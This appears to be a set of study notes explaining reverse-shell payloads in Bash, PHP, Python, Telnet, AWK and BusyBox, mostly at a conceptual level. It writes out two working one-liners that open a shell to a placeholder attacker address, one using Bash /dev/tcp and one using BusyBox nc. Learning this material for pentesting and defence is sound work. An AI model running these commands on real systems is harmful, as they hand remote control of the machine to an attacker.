**Shell Payloads**

    A shell payload is a command or script that connects a shell to another machine.

    For a reverse shell, the payload makes the target connect to the attacker:

    Target shell
        ↓
    Payload
        ↓
    Connect to ATTACKER_IP:443
        ↓
    Attacker's listener
        ↓
    Interactive shell

    There are many payloads because different systems may have different tools and languages available.


**1.Bash Reverse Shell**

    Bash has a built-in /dev/tcp feature that can create a TCP connection.
    eg.: 
    bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1

    The redirections connect the shell's:

    stdin → input from attacker
    stdout → output to attacker
    stderr → error messages to attacker

    So the attacker can interact with the Bash shell remotely.

    There are several Bash variations using file descriptors such as 5 or 196. Although the syntax differs, the goal is essentially the same:

    Connect Bash's input/output to a network connection.

**2.PHP Reverse Shells**

    PHP can create a network connection using fsockopen().
    and then execute a shell using functions such as:
    exec()
    shell_exec()
    system()
    passthru()
    popen()

    Concept: 
    PHP script
    ↓
    fsockopen()
    ↓
    Connect to ATTACKER_IP:443
    ↓
    Execute shell
    ↓
    Send shell input/output through connection

    The different PHP functions mainly change how the command is executed and how its output is handled.

    This is particularly relevant to web application security because a vulnerable PHP application may provide a way for attacker-controlled PHP code to execute.

**3.Python Reverse Shell**

    Python can create a socket and connect to the attacker's machine.
    The core concept is:
    socket → connect() → attacker

    Then: os.dup2()
    redirects the shell's standard input/output/error to the network socket.

    Finally:
    pty.spawn("bash")
    can provide a more interactive Bash session.

    Python
    ↓
    Create socket
    ↓
    Connect to attacker
    ↓
    Redirect stdin/stdout/stderr
    ↓
    Spawn Bash
    ↓
    Reverse shell

    The different Python examples are mostly different ways of accomplishing the same task.

**4.Other Shell Payloads**

    There are many other programs that can sometimes be used to establish reverse shells.

    1. Telnet

    Uses Telnet together with a named pipe:
    Named pipe
        ↕
    Telnet
        ↕
    Attacker

    2. AWK

    Some versions of AWK have networking capabilities that can be abused to create a TCP connection and exchange commands/output.

    3. BusyBox

    BusyBox commonly exists on lightweight Linux systems and can provide a minimal nc implementation:
    busybox nc ATTACKER_IP 443 -e sh

    BusyBox nc
        ↓
    Connect to attacker
        ↓
    Execute /bin/sh
        ↓
    Shell available remotely

    This is particularly relevant to embedded devices, IoT devices, and minimal Linux environments, where full-featured tools may not be installed.

**Why Are There So Many Reverse-Shell Payloads?**

    Because the target system may not have the same tools available.
    The attacker/pentester chooses a payload based on what is available on the target.

**Key Take:**

    A reverse-shell payload is simply a way to connect a target's shell to a remote listener. Different payloads use different programs—Bash, PHP, Python, Telnet, AWK, or BusyBox—to accomplish the same basic goal.